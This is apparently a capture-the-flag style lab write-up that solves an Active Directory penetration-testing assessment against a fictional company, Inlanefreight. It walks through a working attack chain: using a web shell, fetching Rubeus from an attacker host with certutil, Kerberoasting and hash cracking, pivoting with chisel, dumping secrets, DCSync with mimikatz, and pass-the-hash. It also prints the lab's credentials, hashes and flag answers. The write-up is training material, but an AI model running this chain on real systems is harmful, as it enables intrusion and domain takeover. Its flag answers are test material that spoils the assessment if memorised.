## Scenario

A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.

### Solution 
```txt
1. Go to http://10.129.202.242/uploads/antak.aspx to get the webshell
2. Get first flag:
PS> type c:\users\administrator\desktop\flag.txt
JusT_g3tt1ng_st@rt3d!

3. Kerberoasting on MSSQLSvc/SQL01.inlanefreight.local
a. Set up web server and Upload Rubeus
> certutil.exe -urlcache -f http://10.10.14.170:8001/Rubeus.exe Rubeus.exe
> .\Rubeus.exe kerberoast /nowrap

b. Crack sql_svc TGS hash:
> hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
lucky7

4. Set up CHISEL to pivot through network.
a. Get it on the target host web shell
b. Set up and run it on server and client
c. Find ip address of MS01
> proxychains netexec smb 172.16.6.0/24 2>/dev/null
SMB         172.16.6.50     445    MS01 

d. Connect as svc_sql with psexec.py since we have write permissions on a share:
> proxychains psexec.py inlanefreight.local/svc_sql:'lucky7'@172.16.6.50
C:\Users\Administrator\Desktop> type flag.txt
spn$_r0ast1ng_on_@n_0p3n_f1re

5. We need to find tpetty credential
a. We see we have all privileges so we can dump hashes from registry hashes
> *DOWNLOAD REGISTRY*
> secretsdump.py -sam sam.save -security security.exe -system system.save LOCAL
(Unknown User):Sup3rS3cur3D0m@inU2eR
> proxychains netexec smb 172.16.6.3 -u 'tpetty' -p 'Sup3rS3cur3D0m@inU2eR' 2>/dev/null

6. With bloodhound we see we can perform a DCSync attach on the domain
We just perform the attack with mimikatz
mimikatz# lsadump:dcsync /domain:inlanefreight.local /user:inlanefreight\administrator
27dedb1dab4d8545c6e1c66fba077da0

Now we can Pass The Hash with psexec.py

> proxychains psexec.py administrator@172.16.6.3 -hashes :27dedb1dab4d8545c6e1c66fba077da0
type c:\users\administrator\desktop\flag.txt
r3plicat1on_m@st3r! 
```

